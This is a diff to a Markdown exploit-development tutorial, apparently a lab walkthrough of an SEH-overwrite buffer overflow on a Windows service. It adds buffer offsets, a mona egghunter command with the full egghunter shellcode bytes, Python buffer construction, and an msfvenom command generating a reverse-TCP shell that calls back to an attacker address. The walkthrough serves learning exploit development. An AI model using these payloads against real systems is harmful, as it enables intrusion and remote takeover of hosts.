@@ -777,6 +777,24 @@ Now if we step through by pressing `F7` we will first `POP EBX` `POP EBP` and fi
 
 
 
+Just to explain in a little more detail what happens here
+
+- **POP EBX** - *POP's* top of stack into **EBX Register** - ***7DEB6AB9***
+- **POP EBP** - *POP's* top of stack into **EBP Register** - ***0237ED34***
+- **RETN** - *Returns* / pushes value at the top of the stack into **EIP Register** - ***0237FFC4***
+
+
+
+Now you may notice that ***0237FFC4*** looks familiar, if we check out **SEH Chain** again we will see that ***0237FFC4*** corresponds to **nSEH**
+
+
+
+<p align = "center">
+<img src = "https://i.imgur.com/NfiHe4e.png">
+</p>
+
+
+
 
 <p align = "center">
 <img src = "https://i.imgur.com/6MReMKJ.png">
@@ -789,5 +807,126 @@ As you can see **EIP** points too `024FFFC4` which relates to the instruction at
 
 
 
+
+
+
+### [](#header-3) Generating Egghunter
+
+
+
+As I have already talked about why we use Egghunters and how they work I will jump straight into it, first let's analyze the stack and what are working with here.
+
+
+
+<p align = "center">
+<img src = "https://i.imgur.com/DgCBQu8.png">
+</p>
+
+
+
+
+
+As previously mentioned it takes **3515 Bytes** to get too **nSEH** and **3519 Bytes** to overwrite the pointer to **SE handler** and afterwards we have **52 Bytes** of space, in this case represented by `DDDDD...` - Of course 52 bytes is not enough space for our *shellcode* but it is enough for a Egghunter as we only require **32 Bytes** - Providing we can get our shellcode onto memory via other means with the relevant Egghunter *tag* we should be able to execute just fine. 
+
+
+
+As per usual I will be using **mona** to assist me with this stage due to simplicity. 
+
+
+
+**Generating Egghunter with Mona**
+
+
+
+```python
+!mona egg -t MOCH
+```
+
+
+
+By default **mona** will generate an Egghunter with the default tag of `w00t` which will work perfectly fine but here I have chose to specify a custom tag of `MOCH`
+
+
+
+Perfect, now let's add this to our exploit script 
+
+
+
+```python
+egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+"\xef\xb8\x4d\x4f\x43\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
+```
+
+
+
+It's worth noting that Egghunters should be checked for previously discovered bad characters also.
+
+
+
+We will also define our `tag` inside a variable **<u>TWICE</u>** so that the Egghunter does not find itself when executing and searching memory.
+
+
+
+```python
+egg = 'MOCHMOCH'
+```
+
+
+
+I will also take this time to replace the `junk` variable with
+
+```python
+buffer += egghunter
+junk = "D"*(5000-len(buffer))
+buffer += junk #Bunch of D"s to fill remaining space
+```
+
+
+
+This will allow us to add the Egghunter shell code straight after **SEH** followed by a bunch of D's to fill the remaining space just to be careful. 
+
+
+
+Let's now generate some shell code, make some last adjustments to the overall exploit and give it a try. 
+
+
+
+
+### [](#header-3) Generating Shellcode & Final Exploit
+
+
+
+As always I will be using MSFVenom here to generate some shellcode as we are not really fighting against advanced anti-virus or anything so no need to be fancy, let's just simply use the below code.
+
+
+
+```bash
+m0chan@kali:/> msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
+```
+
+
+
+Great shell code is now generated we simply just pop this into our final exploit.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### [](#header-3) Overview / Exploit Conclusion
+
+## [](#header-2) VulnServer w/o Egghunter
 
 ## [](#header-2) BigAnt Server
